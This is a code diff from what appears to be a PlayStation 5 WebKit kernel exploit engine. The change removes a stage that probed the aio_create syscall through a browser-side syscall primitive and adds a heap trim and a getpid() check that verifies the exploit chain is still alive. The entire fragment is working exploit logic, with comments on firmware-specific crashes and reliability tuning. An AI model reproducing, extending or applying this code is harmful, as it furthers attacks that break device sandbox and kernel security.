@@ -648,54 +648,29 @@ export function makeBagagwaEngine(X) {
             note("[S0-0a] aio_init not in stub table — older FW path, skipping");
         }
 
-        // Tier 2: aio_create (0x29C) — creates a self-contained AIO channel fd.
-        // This has a SEPARATE sandbox permission from aio_init and may be allowed.
+        // Tier 2: SKIPPED per upstream OzRviju/bagagwa-exploit v8/v12:
+        // aio_create/aio_init are not in the writeup (only aio_submit 0x295
+        // + aio_multi_wait 0x297) and aio_create caused the OOM crash on
+        // PS5 (FW 11.40+). v12: pointer-as-arg1 is read as count -> huge
+        // kernel alloc -> OOM. Do NOT call 0x29C from WebKit.
         if (!S.aioInited) {
-            note("[S0-0b] Tier 2: aio_create (0x" + SYS_AIO_CREATE.toString(16) + ")...");
-            if (P.syscalls[SYS_AIO_CREATE] !== undefined) {
-                // Trim heap before the risky probe so the PS5 OOM dialog
-                // doesn't fire first (and queued remote logs get ~500ms to
-                // flush). This is the exact spot the fullscreen
-                // "no free memory" used to hide the screen.
-                try { note("[S0-0b] trimming heap before probe (gc+settle)..."); } catch (_) {}
-                try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) {}
-                try { await sleep(600); } catch (_) {}
-                // Try aio_create(maxReqs, flags). Each probe is individually
-                // try/caught so a hung/bad stub (worker no-return -> WATCHDOG
-                // throw from sys()) falls through to the next probe instead
-                // of stalling Stage 0 with no further logs.
-                let createR = null;
-                try {
-                    createR = await sys(SYS_AIO_CREATE, 8, 0);
-                    note("[S0-0b] aio_create(8,0) ret=" + createR.s32 + " err=" + createR.errText);
-                } catch (e) {
-                    note("[S0-0b] aio_create(8,0) threw: " + (e && e.message ? e.message : e) + " — trying 1-arg form");
+            note("[S0-0b] Tier 2 SKIPPED: aio_create not in writeup, OOMs (upstream v8) — going straight to pipe/submit");
+            // Chain health check only (zero-alloc): proves the worker is
+            // alive after the trim without touching 0x29C.
+            try { note("[S0-0b] trimming heap before pipe stage (gc+settle)..."); } catch (_) {}
+            try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) {}
+            try { await sleep(600); } catch (_) {}
+            try {
+                const chk = await sys(SYS_GETPID);
+                note("[S0-0b] chain re-check getpid()=" + chk.s32 + " err=" + chk.errText);
+                if (chk.failed || chk.s32 <= 0) {
+                    out.why = "chain died after trim (getpid failed: " + chk.errText + ") — heap/worker issue";
+                    return out;
                 }
-                if (createR && !createR.failed && createR.s32 >= 0) {
-                    S.aioCtxFd = createR.s32;
-                    S.aioInited = true;
-                    track(S.aioCtxFd);
-                    note("[S0-0b] AIO channel created via aio_create: ctxFd=" + S.aioCtxFd);
-                } else {
-                    if (createR) note("[S0-0b] aio_create also denied (" + createR.errText + ")");
-                    // Try aio_create with just 1 arg (some firmware variants)
-                    try {
-                        const createR2 = await sys(SYS_AIO_CREATE, 8);
-                        note("[S0-0b] aio_create(8) ret=" + createR2.s32 + " err=" + createR2.errText);
-                        if (!createR2.failed && createR2.s32 >= 0) {
-                            S.aioCtxFd = createR2.s32;
-                            S.aioInited = true;
-                            track(S.aioCtxFd);
-                            note("[S0-0b] AIO channel via aio_create(1-arg): ctxFd=" + S.aioCtxFd);
-                        } else {
-                            note("[S0-0b] aio_create also blocked — AIO fully sandboxed");
-                        }
-                    } catch (e2) {
-                        note("[S0-0b] aio_create(8) threw: " + (e2 && e2.message ? e2.message : e2) + " — continuing to Tier 3");
-                    }
-                }
-            } else {
-                note("[S0-0b] aio_create not in stub table");
+            } catch (e) {
+                note("[S0-0b] chain re-check threw: " + (e && e.message ? e.message : e));
+                out.why = "chain hung after trim (getpid no-return) — heap/worker issue";
+                return out;
             }
         }
 
